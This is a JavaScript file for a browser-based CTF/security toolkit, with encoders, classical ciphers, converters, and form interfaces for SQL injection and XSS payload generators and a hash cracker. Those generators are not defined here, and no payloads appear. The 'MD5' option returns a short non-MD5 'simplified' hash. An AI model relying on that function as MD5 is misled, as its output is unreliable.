// Navigation functionality
document.addEventListener('DOMContentLoaded', function() {
    const navLinks = document.querySelectorAll('.nav-link');
    const sections = document.querySelectorAll('.tool-section');

    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const targetSection = this.getAttribute('data-section');

            // Remove active class from all nav links and sections
            navLinks.forEach(l => l.classList.remove('active'));
            sections.forEach(s => s.classList.remove('active'));

            // Add active class to clicked nav link and corresponding section
            this.classList.add('active');
            document.getElementById(targetSection).classList.add('active');
        });
    });
});

// Modal functionality
function showTool(toolName) {
    const modal = document.getElementById('toolModal');
    const modalTitle = document.getElementById('modalTitle');
    const modalBody = document.getElementById('modalBody');

    modalTitle.textContent = getToolTitle(toolName);
    modalBody.innerHTML = getToolInterface(toolName);
    modal.style.display = 'block';

    // Initialize tool-specific functionality
    initializeTool(toolName);
}

function closeModal() {
    document.getElementById('toolModal').style.display = 'none';
}

// Close modal when clicking outside
window.onclick = function(event) {
    const modal = document.getElementById('toolModal');
    if (event.target === modal) {
        closeModal();
    }
}

// Tool titles mapping
function getToolTitle(toolName) {
    const titles = {
        'base64': 'Base64 Encoder/Decoder',
        'hash': 'Hash Analyzer',
        'cipher': 'Caesar Cipher',
        'hex': 'Hex Converter',
        'url': 'URL Encoder/Decoder',
        'ascii': 'ASCII Converter',
        'caesar': 'Caesar Cipher',
        'vigenere': 'Vigenère Cipher',
        'atbash': 'Atbash Cipher',
        'rot13': 'ROT13 Cipher',
        'hash-identifier': 'Hash Identifier',
        'md5': 'MD5 Tools',
        'sha': 'SHA Tools',
        'rainbow': 'Rainbow Tables Lookup',
        'sqli-detector': 'SQL Injection Detector',
        'payload-generator': 'Payload Generator',
        'xss-detector': 'XSS Detector',
        'js-beautifier': 'JavaScript Beautifier',
        'request-builder': 'HTTP Request Builder',
        'header-analyzer': 'HTTP Header Analyzer',
        'file-analyzer': 'File Analyzer',
        'metadata-extractor': 'Metadata Extractor',
        'hex-viewer': 'Hex Viewer',
        'stego-detector': 'Steganography Detector',
        'lsb-extractor': 'LSB Steganography Extractor',
        'pcap-analyzer': 'PCAP Analyzer',
        'packet-viewer': 'Network Packet Viewer',
        'disassembler': 'Binary Disassembler',
        'decompiler': 'Code Decompiler',
        'binary-analyzer': 'Binary File Analyzer',
        'string-extractor': 'String Extractor',
        'rop-gadget': 'ROP Gadget Finder',
        'shellcode-generator': 'Shellcode Generator',
        'pattern-generator': 'Pattern Generator',
        'offset-finder': 'Offset Finder',
        'qr-decoder': 'QR Code Decoder',
        'barcode-decoder': 'Barcode Decoder',
        'morse-decoder': 'Morse Code Decoder',
        'brainfuck': 'Brainfuck Interpreter',
        'jwt-decoder': 'JWT Token Decoder',
        'sql-injection': 'SQL Injection Tool',
        'xss-payloads': 'XSS Payload Generator',
        'hash-cracker': 'Hash Cracker',
        'steganography': 'Steganography Analyzer',
        'binary-converter': 'Binary Converter',
        'forensics-analyzer': 'File Forensics Analyzer',
        'password-generator': 'Password Generator'
    };
    return titles[toolName] || 'Unknown Tool';
}

// Tool interfaces
function getToolInterface(toolName) {
    switch(toolName) {
        case 'base64':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="base64Input" rows="4" placeholder="Enter text to encode/decode"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="base64Encode()">Encode</button>
                        <button class="btn" onclick="base64Decode()">Decode</button>
                        <button class="btn" onclick="clearBase64()">Clear</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="base64Output" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'hash':
        case 'hash-identifier':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Hash Input:</label>
                        <input type="text" id="hashInput" placeholder="Enter hash to identify/analyze">
                    </div>
                    <button class="btn" onclick="analyzeHash()">Analyze Hash</button>
                    <div class="input-group">
                        <label>Hash Analysis:</label>
                        <div id="hashOutput" class="output-area"></div>
                    </div>
                    <div class="input-group">
                        <label>Generate Hash:</label>
                        <input type="text" id="textToHash" placeholder="Enter text to hash">
                        <select id="hashType">
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA-1</option>
                            <option value="sha256">SHA-256</option>
                            <option value="sha512">SHA-512</option>
                        </select>
                        <button class="btn" onclick="generateHash()">Generate Hash</button>
                        <div id="generatedHash" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'caesar':
        case 'cipher':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="caesarInput" rows="4" placeholder="Enter text to encrypt/decrypt"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Shift Value (0-25):</label>
                        <input type="number" id="caesarShift" min="0" max="25" value="13">
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="caesarEncrypt()">Encrypt</button>
                        <button class="btn" onclick="caesarDecrypt()">Decrypt</button>
                        <button class="btn" onclick="caesarBruteForce()">Brute Force</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="caesarOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'hex':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea id="hexInput" rows="4" placeholder="Enter text or hex to convert"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="textToHex()">Text to Hex</button>
                        <button class="btn" onclick="hexToText()">Hex to Text</button>
                        <button class="btn" onclick="hexToDecimal()">Hex to Decimal</button>
                        <button class="btn" onclick="decimalToHex()">Decimal to Hex</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="hexOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'url':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>URL Input:</label>
                        <textarea id="urlInput" rows="4" placeholder="Enter URL to encode/decode"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="urlEncode()">URL Encode</button>
                        <button class="btn" onclick="urlDecode()">URL Decode</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="urlOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'vigenere':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="vigenereInput" rows="4" placeholder="Enter text to encrypt/decrypt"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Key:</label>
                        <input type="text" id="vigenereKey" placeholder="Enter encryption key">
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="vigenereEncrypt()">Encrypt</button>
                        <button class="btn" onclick="vigenereDecrypt()">Decrypt</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="vigenereOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'morse-decoder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea id="morseInput" rows="4" placeholder="Enter text or morse code"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="textToMorse()">Text to Morse</button>
                        <button class="btn" onclick="morseToText()">Morse to Text</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="morseOutput" class="output-area"></div>
                    </div>
                    <div class="message info">
                        <strong>Morse Code Reference:</strong><br>
                        Use dots (.) and dashes (-) separated by spaces for letters, and spaces between words.
                    </div>
                </div>
            `;

        case 'request-builder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>HTTP Method:</label>
                        <select id="httpMethod">
                            <option value="GET">GET</option>
                            <option value="POST">POST</option>
                            <option value="PUT">PUT</option>
                            <option value="DELETE">DELETE</option>
                            <option value="HEAD">HEAD</option>
                            <option value="OPTIONS">OPTIONS</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>URL:</label>
                        <input type="text" id="requestUrl" placeholder="https://example.com/api/endpoint">
                    </div>
                    <div class="input-group">
                        <label>Headers (JSON format):</label>
                        <textarea id="requestHeaders" rows="3" placeholder='{"Content-Type": "application/json", "Authorization": "Bearer token"}'></textarea>
                    </div>
                    <div class="input-group">
                        <label>Body (for POST/PUT):</label>
                        <textarea id="requestBody" rows="4" placeholder="Request body content"></textarea>
                    </div>
                    <button class="btn" onclick="buildRequest()">Build Request</button>
                    <div class="input-group">
                        <label>Generated Request:</label>
                        <div id="requestOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'jwt-decoder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>JWT Token:</label>
                        <textarea id="jwtInput" rows="4" placeholder="Enter JWT token to decode"></textarea>
                    </div>
                    <button class="btn" onclick="decodeJWT()">Decode JWT</button>
                    <div class="input-group">
                        <label>Decoded JWT:</label>
                        <div id="jwtOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'sql-injection':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Target URL:</label>
                        <input type="text" id="sqlUrl" placeholder="http://target.com/page.php?id=1">
                    </div>
                    <div class="input-group">
                        <label>Parameter:</label>
                        <input type="text" id="sqlParam" placeholder="id">
                    </div>
                    <div class="input-group">
                        <label>Payload Type:</label>
                        <select id="sqlPayloadType">
                            <option value="union">UNION Based</option>
                            <option value="boolean">Boolean Based</option>
                            <option value="time">Time Based</option>
                            <option value="error">Error Based</option>
                        </select>
                    </div>
                    <button class="btn" onclick="generateSQLPayloads()">Generate Payloads</button>
                    <div class="input-group">
                        <label>Generated Payloads:</label>
                        <div id="sqlOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'xss-payloads':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Context:</label>
                        <select id="xssContext">
                            <option value="html">HTML Context</option>
                            <option value="attribute">Attribute Context</option>
                            <option value="javascript">JavaScript Context</option>
                            <option value="css">CSS Context</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Bypass Type:</label>
                        <select id="xssBypass">
                            <option value="basic">Basic XSS</option>
                            <option value="filter">Filter Bypass</option>
                            <option value="waf">WAF Bypass</option>
                            <option value="encoded">Encoded Payloads</option>
                        </select>
                    </div>
                    <button class="btn" onclick="generateXSSPayloads()">Generate XSS Payloads</button>
                    <div class="input-group">
                        <label>XSS Payloads:</label>
                        <div id="xssOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'hash-cracker':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Hash to Crack:</label>
                        <input type="text" id="crackHash" placeholder="Enter hash">
                    </div>
                    <div class="input-group">
                        <label>Hash Type:</label>
                        <select id="crackHashType">
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA-1</option>
                            <option value="sha256">SHA-256</option>
                            <option value="ntlm">NTLM</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Wordlist:</label>
                        <select id="wordlist">
                            <option value="common">Common Passwords</option>
                            <option value="rockyou">RockYou Top 1000</option>
                            <option value="custom">Custom List</option>
                        </select>
                    </div>
                    <div class="input-group" id="customWordlistGroup" style="display: none;">
                        <label>Custom Wordlist (one per line):</label>
                        <textarea id="customWordlist" rows="4" placeholder="password1\npassword2\nadmin\n123456"></textarea>
                    </div>
                    <button class="btn" onclick="crackHash()">Crack Hash</button>
                    <div class="input-group">
                        <label>Result:</label>
                        <div id="crackOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'steganography':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload Image:</label>
                        <input type="file" id="stegoImage" accept="image/*">
                    </div>
                    <div class="input-group">
                        <label>Analysis Type:</label>
                        <select id="stegoType">
                            <option value="lsb">LSB Analysis</option>
                            <option value="metadata">Metadata Extraction</option>
                            <option value="strings">String Extraction</option>
                            <option value="visual">Visual Analysis</option>
                        </select>
                    </div>
                    <button class="btn" onclick="analyzeSteganography()">Analyze Image</button>
                    <div class="input-group">
                        <label>Analysis Results:</label>
                        <div id="stegoOutput" class="output-area"></div>
                    </div>
                    <div id="stegoCanvas" style="margin-top: 1rem;"></div>
                </div>
            `;

        case 'binary-converter':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea id="binaryInput" rows="4" placeholder="Enter text, binary, decimal, or hex"></textarea>
                    </div>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem;">
                        <button class="btn" onclick="textToBinary()">Text → Binary</button>
                        <button class="btn" onclick="binaryToText()">Binary → Text</button>
                        <button class="btn" onclick="textToHex()">Text → Hex</button>
                        <button class="btn" onclick="hexToText()">Hex → Text</button>
                        <button class="btn" onclick="textToDecimal()">Text → Decimal</button>
                        <button class="btn" onclick="decimalToText()">Decimal → Text</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="binaryOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'forensics-analyzer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload File:</label>
                        <input type="file" id="forensicsFile">
                    </div>
                    <div class="input-group">
                        <label>Analysis Type:</label>
                        <select id="forensicsType">
                            <option value="header">File Header Analysis</option>
                            <option value="strings">String Extraction</option>
                            <option value="metadata">Metadata Analysis</option>
                            <option value="entropy">Entropy Analysis</option>
                        </select>
                    </div>
                    <button class="btn" onclick="analyzeFile()">Analyze File</button>
                    <div class="input-group">
                        <label>Analysis Results:</label>
                        <div id="forensicsOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'password-generator':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Password Length:</label>
                        <input type="number" id="passLength" value="12" min="4" max="128">
                    </div>
                    <div class="input-group">
                        <label>Character Sets:</label>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem;">
                            <label><input type="checkbox" id="includeUpper" checked> Uppercase (A-Z)</label>
                            <label><input type="checkbox" id="includeLower" checked> Lowercase (a-z)</label>
                            <label><input type="checkbox" id="includeNumbers" checked> Numbers (0-9)</label>
                            <label><input type="checkbox" id="includeSymbols"> Symbols (!@#$%)</label>
                        </div>
                    </div>
                    <div class="input-group">
                        <label>Count:</label>
                        <input type="number" id="passCount" value="5" min="1" max="50">
                    </div>
                    <button class="btn" onclick="generatePasswords()">Generate Passwords</button>
                    <div class="input-group">
                        <label>Generated Passwords:</label>
                        <div id="passwordOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'rot13':
        case 'atbash':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="cipherInput" rows="4" placeholder="Enter text to encrypt/decrypt"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="applyCipher('${toolName}')">Apply ${toolName.toUpperCase()}</button>
                        <button class="btn" onclick="clearCipher()">Clear</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="cipherOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'ascii':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea id="asciiInput" rows="4" placeholder="Enter text or ASCII codes"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="textToAscii()">Text to ASCII</button>
                        <button class="btn" onclick="asciiToText()">ASCII to Text</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="asciiOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'md5':
        case 'sha':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="hashTextInput" rows="4" placeholder="Enter text to hash"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Hash Type:</label>
                        <select id="selectedHashType">
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA-1</option>
                            <option value="sha256">SHA-256</option>
                            <option value="sha512">SHA-512</option>
                        </select>
                    </div>
                    <button class="btn" onclick="generateSpecificHash()">Generate Hash</button>
                    <div class="input-group">
                        <label>Generated Hash:</label>
                        <div id="specificHashOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'rainbow':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Hash to Lookup:</label>
                        <input type="text" id="rainbowHash" placeholder="Enter hash for rainbow table lookup">
                    </div>
                    <button class="btn" onclick="rainbowLookup()">Rainbow Table Lookup</button>
                    <div class="input-group">
                        <label>Lookup Result:</label>
                        <div id="rainbowOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'metadata-extractor':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload File:</label>
                        <input type="file" id="metadataFile">
                    </div>
                    <button class="btn" onclick="extractMetadata()">Extract Metadata</button>
                    <div class="input-group">
                        <label>Extracted Metadata:</label>
                        <div id="metadataOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'hex-viewer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload File or Enter Hex:</label>
                        <input type="file" id="hexViewerFile">
                        <textarea id="hexViewerInput" rows="4" placeholder="Or paste hex data here"></textarea>
                    </div>
                    <button class="btn" onclick="viewHex()">View Hex</button>
                    <div class="input-group">
                        <label>Hex View:</label>
                        <div id="hexViewerOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'js-beautifier':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>JavaScript Code:</label>
                        <textarea id="jsInput" rows="6" placeholder="Enter minified JavaScript code"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="beautifyJS()">Beautify</button>
                        <button class="btn" onclick="minifyJS()">Minify</button>
                    </div>
                    <div class="input-group">
                        <label>Formatted Code:</label>
                        <div id="jsOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'header-analyzer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>URL to Analyze:</label>
                        <input type="text" id="headerUrl" placeholder="https://example.com">
                    </div>
                    <button class="btn" onclick="analyzeHeaders()">Analyze Headers</button>
                    <div class="input-group">
                        <label>Security Headers Analysis:</label>
                        <div id="headerOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        default:
            return `
                <div class="tool-interface">
                    <div class="message info">
                        <h4>Tool: ${getToolTitle(toolName)}</h4>
                        <p>This tool is currently under development. It will include advanced functionality for ${toolName} analysis and manipulation.</p>
                        <p><strong>Features coming soon:</strong></p>
                        <ul style="margin-left: 2rem; margin-top: 1rem;">
                            <li>Advanced ${toolName} processing</li>
                            <li>Multiple format support</li>
                            <li>Real-time analysis</li>
                            <li>Export functionality</li>
                        </ul>
                    </div>
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea rows="4" placeholder="Input will be processed here..."></textarea>
                    </div>
                    <button class="btn" onclick="showMessage('This tool is coming soon!', 'info')">Process</button>
                    <div class="input-group">
                        <label>Output:</label>
                        <div class="output-area">Output will appear here...</div>
                    </div>
                </div>
            `;
    }
}

// Tool initialization
function initializeTool(toolName) {
    // Tool-specific initialization can be added here
    console.log(`Initialized tool: ${toolName}`);
}

// Base64 functions
function base64Encode() {
    const input = document.getElementById('base64Input').value;
    const output = document.getElementById('base64Output');
    try {
        const encoded = btoa(unescape(encodeURIComponent(input)));
        output.textContent = encoded;
        showMessage('Text encoded successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid input for encoding';
        showMessage('Encoding failed!', 'error');
    }
}

function base64Decode() {
    const input = document.getElementById('base64Input').value;
    const output = document.getElementById('base64Output');
    try {
        const decoded = decodeURIComponent(escape(atob(input)));
        output.textContent = decoded;
        showMessage('Base64 decoded successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid Base64 input';
        showMessage('Decoding failed!', 'error');
    }
}

function clearBase64() {
    document.getElementById('base64Input').value = '';
    document.getElementById('base64Output').textContent = '';
}

// Hash functions
async function generateHash() {
    const text = document.getElementById('textToHash').value;
    const hashType = document.getElementById('hashType').value;
    const output = document.getElementById('generatedHash');

    if (!text) {
        showMessage('Please enter text to hash', 'error');
        return;
    }

    try {
        const encoder = new TextEncoder();
        const data = encoder.encode(text);
        let hashBuffer;

        switch(hashType) {
            case 'md5':
                // MD5 implementation (simplified)
                output.textContent = await simpleHash(text, 'md5');
                break;
            case 'sha1':
                hashBuffer = await crypto.subtle.digest('SHA-1', data);
                break;
            case 'sha256':
                hashBuffer = await crypto.subtle.digest('SHA-256', data);
                break;
            case 'sha512':
                hashBuffer = await crypto.subtle.digest('SHA-512', data);
                break;
        }

        if (hashBuffer) {
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            output.textContent = hashHex;
        }

        showMessage(`${hashType.toUpperCase()} hash generated successfully!`, 'success');
    } catch (error) {
        output.textContent = 'Error generating hash';
        showMessage('Hash generation failed!', 'error');
    }
}

function analyzeHash() {
    const hash = document.getElementById('hashInput').value.trim();
    const output = document.getElementById('hashOutput');

    if (!hash) {
        showMessage('Please enter a hash to analyze', 'error');
        return;
    }

    const analysis = identifyHashType(hash);
    output.innerHTML = `
        <strong>Hash Analysis:</strong><br>
        Length: ${hash.length} characters<br>
        Possible Types: ${analysis.types.join(', ')}<br>
        Most Likely: ${analysis.mostLikely}<br>
        Charset: ${analysis.charset}<br>
        <br>
        <strong>Recommendations:</strong><br>
        ${analysis.recommendations.join('<br>')}
    `;

    showMessage('Hash analyzed successfully!', 'success');
}

function identifyHashType(hash) {
    const length = hash.length;
    const charset = /^[a-f0-9]+$/i.test(hash) ? 'Hexadecimal' : 'Mixed/Unknown';
    let types = [];
    let mostLikely = 'Unknown';
    let recommendations = [];

    switch(length) {
        case 32:
            if (charset === 'Hexadecimal') {
                types = ['MD5', 'MD4', 'MD2'];
                mostLikely = 'MD5';
                recommendations = ['Try online MD5 rainbow tables', 'Use hashcat with MD5 mode'];
            }
            break;
        case 40:
            if (charset === 'Hexadecimal') {
                types = ['SHA-1', 'MySQL5'];
                mostLikely = 'SHA-1';
                recommendations = ['Try SHA-1 rainbow tables', 'Use hashcat with SHA-1 mode'];
            }
            break;
        case 64:
            if (charset === 'Hexadecimal') {
                types = ['SHA-256', 'SHA3-256'];
                mostLikely = 'SHA-256';
                recommendations = ['Try dictionary attacks', 'Use hashcat with SHA-256 mode'];
            }
            break;
        case 128:
            if (charset === 'Hexadecimal') {
                types = ['SHA-512', 'SHA3-512'];
                mostLikely = 'SHA-512';
                recommendations = ['Try dictionary attacks', 'Use hashcat with SHA-512 mode'];
            }
            break;
        default:
            types = ['Unknown hash type'];
            recommendations = ['Check hash length and format', 'Verify hash integrity'];
    }

    return { types, mostLikely, charset, recommendations };
}

// Caesar cipher functions
function caesarEncrypt() {
    const text = document.getElementById('caesarInput').value;
    const shift = parseInt(document.getElementById('caesarShift').value) || 0;
    const output = document.getElementById('caesarOutput');

    const result = caesarCipher(text, shift);
    output.textContent = result;
    showMessage('Text encrypted successfully!', 'success');
}

function caesarDecrypt() {
    const text = document.getElementById('caesarInput').value;
    const shift = parseInt(document.getElementById('caesarShift').value) || 0;
    const output = document.getElementById('caesarOutput');

    const result = caesarCipher(text, -shift);
    output.textContent = result;
    showMessage('Text decrypted successfully!', 'success');
}

function caesarBruteForce() {
    const text = document.getElementById('caesarInput').value;
    const output = document.getElementById('caesarOutput');

    let results = 'Brute Force Results:\n\n';
    for (let i = 0; i < 26; i++) {
        const decrypted = caesarCipher(text, -i);
        results += `Shift ${i}: ${decrypted}\n`;
    }

        output.textContent = results;
    showMessage('Brute force completed!', 'success');
}

function caesarCipher(text, shift) {
    return text.replace(/[a-zA-Z]/g, function(char) {
        const start = char <= 'Z' ? 65 : 97;
        const code = char.charCodeAt(0);
        let shifted = ((code - start + shift + 26) % 26) + start;
        return String.fromCharCode(shifted);
    });
}

// Hex conversion functions
function textToHex() {
    const text = document.getElementById('hexInput').value;
    const output = document.getElementById('hexOutput');

    const hex = Array.from(text)
        .map(char => char.charCodeAt(0).toString(16).padStart(2, '0'))
        .join(' ');

    output.textContent = hex;
    showMessage('Text converted to hex successfully!', 'success');
}

function hexToText() {
    const hex = document.getElementById('hexInput').value.replace(/\s+/g, '');
    const output = document.getElementById('hexOutput');

    try {
        const text = hex.match(/.{1,2}/g)
            .map(byte => String.fromCharCode(parseInt(byte, 16)))
            .join('');
        output.textContent = text;
        showMessage('Hex converted to text successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid hex input';
        showMessage('Conversion failed!', 'error');
    }
}

function hexToDecimal() {
    const hex = document.getElementById('hexInput').value.replace(/\s+/g, '');
    const output = document.getElementById('hexOutput');

    try {
        const decimal = parseInt(hex, 16);
        output.textContent = decimal.toString();
        showMessage('Hex converted to decimal successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid hex input';
        showMessage('Conversion failed!', 'error');
    }
}

function decimalToHex() {
    const decimal = document.getElementById('hexInput').value;
    const output = document.getElementById('hexOutput');

    try {
        const hex = parseInt(decimal).toString(16).toUpperCase();
        output.textContent = hex;
        showMessage('Decimal converted to hex successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid decimal input';
        showMessage('Conversion failed!', 'error');
    }
}

// URL encoding functions
function urlEncode() {
    const text = document.getElementById('urlInput').value;
    const output = document.getElementById('urlOutput');

    const encoded = encodeURIComponent(text);
    output.textContent = encoded;
    showMessage('URL encoded successfully!', 'success');
}

function urlDecode() {
    const text = document.getElementById('urlInput').value;
    const output = document.getElementById('urlOutput');

    try {
        const decoded = decodeURIComponent(text);
        output.textContent = decoded;
        showMessage('URL decoded successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid URL encoding';
        showMessage('Decoding failed!', 'error');
    }
}

// Vigenère cipher functions
function vigenereEncrypt() {
    const text = document.getElementById('vigenereInput').value.toUpperCase();
    const key = document.getElementById('vigenereKey').value.toUpperCase();
    const output = document.getElementById('vigenereOutput');

    if (!key) {
        showMessage('Please enter a key', 'error');
        return;
    }

    const result = vigenereProcess(text, key, true);
    output.textContent = result;
    showMessage('Text encrypted successfully!', 'success');
}

function vigenereDecrypt() {
    const text = document.getElementById('vigenereInput').value.toUpperCase();
    const key = document.getElementById('vigenereKey').value.toUpperCase();
    const output = document.getElementById('vigenereOutput');

    if (!key) {
        showMessage('Please enter a key', 'error');
        return;
    }

    const result = vigenereProcess(text, key, false);
    output.textContent = result;
    showMessage('Text decrypted successfully!', 'success');
}

function vigenereProcess(text, key, encrypt) {
    let result = '';
    let keyIndex = 0;

    for (let i = 0; i < text.length; i++) {
        const char = text[i];

        if (char.match(/[A-Z]/)) {
            const textCode = char.charCodeAt(0) - 65;
            const keyCode = key[keyIndex % key.length].charCodeAt(0) - 65;

            let newCode;
            if (encrypt) {
                newCode = (textCode + keyCode) % 26;
            } else {
                newCode = (textCode - keyCode + 26) % 26;
            }

            result += String.fromCharCode(newCode + 65);
            keyIndex++;
        } else {
            result += char;
        }
    }

    return result;
}

// Morse code functions
function textToMorse() {
    const text = document.getElementById('morseInput').value.toUpperCase();
    const output = document.getElementById('morseOutput');

    const morseCode = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---',
        '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...',
        '8': '---..', '9': '----.', ' ': '/'
    };

    const morse = text.split('').map(char => morseCode[char] || char).join(' ');
    output.textContent = morse;
    showMessage('Text converted to Morse code successfully!', 'success');
}

function morseToText() {
    const morse = document.getElementById('morseInput').value;
    const output = document.getElementById('morseOutput');

    const morseToChar = {
        '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E', '..-.': 'F',
        '--.': 'G', '....': 'H', '..': 'I', '.---': 'J', '-.-': 'K', '.-..': 'L',
        '--': 'M', '-.': 'N', '---': 'O', '.--.': 'P', '--.-': 'Q', '.-.': 'R',
        '...': 'S', '-': 'T', '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X',
        '-.--': 'Y', '--..': 'Z', '-----': '0', '.----': '1', '..---': '2',
        '...--': '3', '....-': '4', '.....': '5', '-....': '6', '--...': '7',
        '---..': '8', '----.': '9', '/': ' '
    };

    const words = morse.split('/');
    const text = words.map(word => 
        word.trim().split(' ').map(code => morseToChar[code] || '?').join('')
    ).join(' ');

    output.textContent = text;
    showMessage('Morse code converted to text successfully!', 'success');
}

// Request builder function
function buildRequest() {
    const method = document.getElementById('httpMethod').value;
    const url = document.getElementById('requestUrl').value;
    const headers = document.getElementById('requestHeaders').value;
    const body = document.getElementById('requestBody').value;
    const output = document.getElementById('requestOutput');

    if (!url) {
        showMessage('Please enter a URL', 'error');
        return;
    }

    let request = `${method} ${url}\n`;

    try {
        if (headers) {
            const headerObj = JSON.parse(headers);
            Object.entries(headerObj).forEach(([key, value]) => {
                request += `${key}: ${value}\n`;
            });
        }
    } catch (error) {
        showMessage('Invalid JSON in headers', 'error');
        return;
    }

    if (body && (method === 'POST' || method === 'PUT')) {
        request += `\n${body}`;
    }

    output.textContent = request;
    showMessage('HTTP request built successfully!', 'success');
}

// Utility functions
async function simpleHash(text, algorithm) {
    // Simplified hash implementation for demo
    let hash = 0;
    for (let i = 0; i < text.length; i++) {
        const char = text.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32-bit integer
    }
    return Math.abs(hash).toString(16).padStart(8, '0');
}

